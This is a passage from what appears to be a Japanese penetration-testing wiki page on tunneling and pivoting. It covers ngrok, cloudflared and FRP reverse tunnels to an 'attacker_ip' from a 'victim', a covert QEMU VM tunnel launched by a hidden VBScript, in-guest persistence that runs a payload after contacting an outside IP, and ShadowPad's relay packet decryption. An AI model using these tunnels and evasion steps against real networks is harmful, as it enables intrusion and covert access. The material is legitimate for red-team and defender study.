これは ngrok Agent Config v2 を使用します。名前付きトンネルでは `proto` と `addr` を使用し、`ngrok start` で起動します。<sup>[[42]](#references)</sup> 3つのトンネルを開きます。

- TCP 2つ
- /tmp/httpbin/ の静的ファイルを公開する HTTP 1つ
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared（Cloudflare Tunnel）

Cloudflare Tunnel の `cloudflared` connector は outbound connection を確立します。公開されたアプリケーションでは HTTP、HTTPS、TCP、SSH、RDP を routing できます。一方、quick tunnel は HTTP の開発用途を想定しています。<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel のワンライナー
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 origin（レガシーモード）

レガシーな `--socks5` flag は、ローカルの origin が SOCKS5 を話すことを `cloudflared` に伝えるものであり、ローカルの SOCKS5 listener を作成するものではありません。managed tunnel では、`originRequest.proxyType: socks` によって SOCKS5 origin の処理を設定します。<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### DNSによる永続的なトンネル

ローカルで管理されるトンネル設定では、以下に示すように、小文字の `tunnel`、`credentials-file`、`url` キーを使用します。<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
コネクタを起動:
```bash
cloudflared tunnel run mytunnel
```
コネクタは outbound 接続を確立し、デフォルトでは HTTP/2 にフォールバックする QUIC をネゴシエートします。すべての deployment が TCP/443 を使用すると想定しないでください。deployment に必要な権限だけで実行してください。<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) は **TCP、UDP、HTTP/S、STCP/SUDP、TCPMUX、XTCP** をサポートする Go reverse proxy です。XTCP は P2P hole punching を使用し、その成功は NAT に依存します。**v0.53.0** 以降は **SSH Tunnel Gateway** として動作できるため、target host は `frpc` binary なしで標準の OpenSSH client を使用できます。<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 新しい SSH gateway を使用する（frpc binary なし）
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
上記のコマンドは、`frps` が gateway を提供する中で、標準の OpenSSH client を使用して victim の **8080** port を **attacker_ip:9000** として公開します。<sup>[[50]](#references)</sup>

## QEMU を使用した covert VM-based Tunnels

QEMU の user-mode networking では、virtual network に root または administrator privilege は不要であり、`-netdev user,hostfwd=...` によって host から guest への TCP、UDP、または UNIX connection を redirect できます。<sup>[[51]](#references)</sup> TrustedSec は、host に焦点を当てた EDR が guest 内部の activity を見逃す可能性がある incident において、Tiny Core QEMU VM と、試行された reverse SSH tunnel について記録しています。<sup>[[1]](#references)</sup>

### 簡単なワンライナー
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 上記のコマンドは、ゲストメモリ256 MiBとqcow2ディスクイメージを使用して**Tiny Core Linux** guestを起動します。ディスクイメージはin-RAM diskではありません。
• Windows hostの**2222/tcp** portは、guest内の**22/tcp**へ透過的にforwardされます。
• 攻撃者の視点では、targetは単にport 2222を公開しているように見えます。そこに到達したパケットは、VM内で実行されているSSH serverによって処理されます。

### VBScriptを介してステルスに起動する

TrustedSecは、上記のincidentでVBSによるQEMUの起動とTiny Core imagesを確認しました。<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs` でスクリプトを実行すると、ウィンドウは非表示のままになる。<sup>[[1]](#references)</sup>

### ゲスト内での永続化

引用されたインシデントでは、`/opt/bootlocal.sh` と `/opt/filetool.lst` を通じて、ステートレスな Tiny Core guest 内で永続化を実現している:<sup>[[1]](#references)</sup>

1. payload を `/opt/123.out` に配置する
2. `/opt/bootlocal.sh` に追加する:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `home/tc` と `opt` を `/opt/filetool.lst` に追加し、シャットダウン時に payload が `mydata.tgz` にパックされるようにする。

### テレメトリに関する考慮事項

• ホストには引き続き QEMU process、qcow2 image、およびホストから forward された listener が露出する。
• ホストのみを対象とする process scan では guest process を検査しない場合があるが、virtualization による evasion が保証されるわけではない。network、QEMU、および image のテレメトリから露見する可能性がある。<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 向けのヒント

• user-writable path にある **予期しない QEMU/VirtualBox/KVM binary** を alert する。
• `qemu-system*.exe` から発信される outbound connection を block する。
• QEMU の launch 直後に bind される、使用頻度の低い listening port（2222、10022、…）を hunt する。

## `HttpAddUrl` 経由の IIS/HTTP.sys relay node（ShadowPad）

Check Point は、ShadowPad の IIS module が `HttpAddUrl` を通じて URL prefix を bind し、侵害された perimeter web server を backdoor および relay node に変える仕組みを説明している。<sup>[[3]](#references)</sup>

同じ report では、以下にまとめた default、wildcard listener、packet decryption、relay queue、debug telemetry の詳細も説明されている。<sup>[[3]](#references)</sup>

* **Config default** – module の JSON config で値が省略されると、実在性のある IIS default（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）に fallback する。これにより、benign traffic には IIS が正しい branding で応答する。
* **Wildcard interception** – operator は URL prefix の semicolon-separated list（host + path に wildcard を使用）を指定する。module は各 entry に対して `HttpAddUrl` を call するため、HTTP.sys は一致する request を malicious handler に route し、一致しない request は通常の IIS behavior に fallback する。
* **Encrypted first packet** – request body の最初の 2 byte に custom 32-bit PRNG の seed が格納される。以降の各 byte は protocol parsing の前に生成された keystream と XOR される:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module は 2 つの list、「servers」（upstream node）と「clients」（downstream implant）を管理する。約 30 秒以内に heartbeat が届かない entry は prune される。両方の list が空でない場合、最初の healthy server と最初の healthy client を pair にし、一方が close するまで両者の socket 間で byte をそのまま pipe する。
* **Debug telemetry** – optional logging では、各 pairing について source IP、destination IP、forward された byte の合計を記録する。investigator はこれらの breadcrumbs を使い、複数の victim にまたがる ShadowPad mesh を再構築した。

---

## 確認すべきその他の tools

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Shadows に潜む: QEMU Virtualization を介した covert tunnel](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell 以前: Storm-2603 の過去の ransomware operation を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragon の内部: stealthy offensive operation の relay network と内部動作を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Firewall/IDS restriction の bypass](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Metasploit における Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
{{#include ../banners/hacktricks-training.md}}
